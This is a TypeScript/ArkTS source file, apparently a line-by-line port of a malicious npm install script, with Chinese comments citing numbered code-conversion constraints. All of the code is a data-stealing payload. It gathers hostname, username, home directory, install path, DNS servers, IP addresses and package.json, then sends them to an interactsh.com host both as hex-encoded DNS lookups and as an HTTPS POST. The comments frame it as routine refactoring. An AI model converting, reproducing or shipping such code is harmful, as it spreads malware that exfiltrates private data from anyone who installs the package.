// 应用约束：使用let/const代替var（约束9）
// 应用约束：显式类型标注（约束10）
// 应用约束：使用箭头函数（约束26）
// 应用约束：模块导入处理（约束60,80）

import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets'; // 约束78：文件后缀改为.ets

const packageName = packageJSON.name;

// 约束24：定义明确类型代替对象字面量类型
interface PathData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any; // 约束10：应使用具体类型，但保持原始逻辑
    ip: string;
}

// 约束26：使用箭头函数
const getFiles = (paths: string[]): string[] => {
    const ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        const mpath = paths[j];
        const files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
};

// 约束32：替换Buffer实现
const toHex = (data: string): string => {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
};

// 约束41：使用常规for循环代替for..in
const gethttpips = (): string[] => {
    const str: string[] = [];
    const networkInterfaces = os.networkInterfaces();
    const interfaces = Object.keys(networkInterfaces);
    for (const item of interfaces) {
        if (item !== "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
};

const getIps = (): string => {
    let str = "";
    const networkInterfaces = os.networkInterfaces();
    const interfaces = Object.keys(networkInterfaces);
    for (const item of interfaces) {
        if (item !== "lo") {
            const addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
};

const getPathChunks = (path: string): string => {
    let str = "p";
    const chunks = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
};

const toName = (pkg: PathData): string[] => {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    const baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化处理逻辑以适应静态类型
        queries.push(`${toHex(pkg.hn)}.${toHex(pkg.p)}.${hostname}`);
    } else {
        queries.push(baseStr);
    }
    return queries;
};

const td: PathData = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips())
};

const qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // 处理DNS查询结果
    });
}

// 约束46：参数解构处理
const trackingData = JSON.stringify(td);
const postData = querystring.stringify({
    msg: trackingData,
});

// 约束51：使用ArkTS HTTP模块
const options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

const req = https.request(options, (res) => {
    res.on("data", (d: Buffer) => {
        // 处理响应数据
    });
});

req.on("error", (e: Error) => {
    // 处理错误
});

req.write(postData);
req.end();
